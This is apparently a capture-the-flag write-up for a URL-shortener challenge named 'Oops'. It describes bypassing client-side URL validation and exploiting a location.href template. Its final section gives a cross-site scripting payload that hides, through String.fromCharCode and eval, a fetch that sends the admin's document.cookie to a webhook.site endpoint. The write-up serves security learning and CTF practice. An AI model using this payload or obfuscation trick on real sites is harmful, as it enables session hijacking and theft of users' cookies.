## Name

**Oops**

*A simple URL shortener. What could go wrong?*

---

### Problem Description

The website is a URL shortener with two main functionalities:

1. **Shorten a custom URL**
2. **Report a shortened URL**, which is then visited by the **admin using a browser puppet** (**IMPORTANT**)

---

### Solution

Since the source code is provided, we identified two key obstacles to exploitation:

* **Client-side URL validation**:
  The site uses a regex-based parser to validate URLs, but the filter is only enforced on the client side. By using **Burp Suite** to repeat and manipulate requests, we bypassed the client-side restrictions.

* **Unsafe redirect template**:
  The redirect logic uses:

  ```javascript
  location.href = "{{url}}"
  ```

  This allows us to attempt injecting a JavaScript payload via the shortened URL.

---

### Payload Development

Initially, direct payloads failed due to sanitization — special characters were escaped, preventing code execution.

However, a useful obfuscation technique came to mind:
**`String.fromCharCode()`**

This method allows us to encode the payload using character codes, which are not filtered, and then decode them client-side at runtime.

---

### Final Payload

```javascript
javascript:eval(String.fromCharCode(**_webhook_to_characters_**))
```

Where the unencoded logic is:

```javascript
fetch('https://webhook.site/some_id?cookie=' + document.cookie)
```

This payload successfully bypasses sanitization and executes in the admin’s browser, sending their cookies to our controlled endpoint.
